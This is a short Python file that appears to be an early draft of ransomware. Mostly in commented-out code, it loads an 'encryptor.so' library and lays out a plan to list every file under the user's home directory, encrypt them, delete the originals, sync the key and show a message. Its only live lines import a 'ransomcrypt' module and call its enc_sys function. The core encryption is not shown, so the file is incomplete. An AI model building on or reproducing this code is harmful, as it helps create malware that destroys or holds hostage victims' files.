# import os
# import sys
# import glob
# from ctypes import *

# lib = "lib/encryptor.so"

# enc = CDLL(lib)

# '''
#     1. Check System
#     2. List and store files present
#     3. encrypt the file and store to as safe place
#     4. delete the original file
#     5. sync the key
#     6. show message
# '''

# # PART-1
# System = sys.platform
# Home = os.path.expanduser("~")
# FileList = list()

# def list_system(path):
#     for file in glob.glob(f"{path}/**", recursive=True):
#         if os.path.isfile(file):
#             FileList.append(file)

# enc.encryptor(Home)
# print(type(Home))
# print(Home)

import ransomcrypt as rc

rc.enc_sys("ls -al")